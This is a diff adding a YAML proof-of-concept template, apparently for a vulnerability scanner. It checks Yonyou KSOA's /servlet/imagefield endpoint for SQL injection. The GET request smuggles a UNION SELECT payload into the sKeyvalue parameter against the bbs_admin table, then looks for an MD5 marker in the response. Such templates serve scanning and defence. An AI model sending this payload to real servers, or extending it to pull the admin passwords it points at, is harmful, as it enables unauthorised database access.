@@ -1,0 +1,18 @@
+name: poc-yaml-yonyou-yonyou_ksoa-imagefield-sqli
+manual: true
+transport: http
+set:
+    rInt1: randomInt(10000, 99999)
+rules:
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','{{rInt1}}'))--+
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(substr(md5(string(rInt1)), 2, 28))
+expression: r1()
+detail:
+    author: secking
+    links:
+        - https://www.yonyou.com/
